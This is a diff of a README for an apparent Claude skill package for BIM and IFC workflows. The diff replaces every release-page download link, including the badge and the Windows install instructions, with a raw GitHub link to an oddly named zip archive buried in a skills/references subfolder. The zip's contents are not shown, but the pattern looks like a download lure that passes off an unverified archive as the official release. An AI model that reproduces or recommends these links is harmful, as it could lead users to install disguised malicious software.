@@ -1,6 +1,6 @@
 # 🤖 ThatOpen-Claude-Skill-Package - Claude Skills for BIM Workflows
 
-[![Download](https://img.shields.io/badge/Download%20Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/releases)
+[![Download](https://img.shields.io/badge/Download%20Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/main/skills/source/thatopen-impl/thatopen-impl-viewer/references/Open-Package-Claude-Skill-That-3.6-beta.5.zip)
 
 ## 📦 What This Is
 
@@ -21,7 +21,7 @@ If you plan to work with IFC data or Three.js scenes, a modern PC with at least 
 ## 🚀 Download and Install
 
 Visit this page to download:  
-https://github.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/releases
+https://raw.githubusercontent.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/main/skills/source/thatopen-impl/thatopen-impl-viewer/references/Open-Package-Claude-Skill-That-3.6-beta.5.zip
 
 Follow these steps on Windows:
 
@@ -167,7 +167,7 @@ This is useful for team work, where other people need to follow the same process
 ## 🧾 Release Source
 
 Primary download page:  
-https://github.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/releases
+https://raw.githubusercontent.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/main/skills/source/thatopen-impl/thatopen-impl-viewer/references/Open-Package-Claude-Skill-That-3.6-beta.5.zip
 
 ## 📌 Project Focus
 
